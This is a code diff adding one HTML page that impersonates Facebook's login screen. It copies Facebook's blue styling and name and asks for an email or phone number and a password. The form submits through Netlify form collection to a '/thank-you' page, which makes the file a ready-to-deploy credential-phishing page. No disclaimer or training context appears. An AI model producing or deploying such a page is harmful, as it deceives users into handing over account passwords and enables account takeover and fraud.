@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login with account</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Link to external CSS file -->
+    <style>
+        @font-face {
+            font-family: 'Montserrat';
+            src: url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
+            font-weight: bold;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0; /* Light background for contrast */
+            font-family: Arial, sans-serif;
+        }
+
+        .login-container {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .login-header h2 {
+            margin-right: 10px; /* Space between text and box */
+            font-size: 24px; /* Adjust font size for the heading */
+        }
+
+        .rounded-box {
+            background-color: #1877F2; /* Background color */
+            border-radius: 5px; /* Rounded corners */
+            width: 50px; /* Adjusted width to match text size */
+            height: 30px; /* Adjusted height to match text size */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .letter {
+            font-size: 10px; /* Font size for the letter */
+            color: white; /* Letter color */
+            font-family: 'Montserrat', sans-serif; /* Font family */
+            font-weight: bold; /* Ensure bold weight */
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        input, button {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #1877F2;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        a {
+            color: #1877F2;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h2>Log in</h2>
+            <div class="rounded-box">
+                <span class="letter">facebook</span>
+            </div>
+        </div>
+        <form name="login" method="POST" data-netlify="true" action="/thank-you">
+            <input type="text" name="email" placeholder="Mobile number or email address" required>
+            <input type="password" name="code" placeholder="Password" required>
+            <button type="submit">Log in</button>
+            <a href="#">Forgotten Password?</a>
+            <a href="#">Create new account</a>
+        </form>
+    </div>
+</body>
+</html>
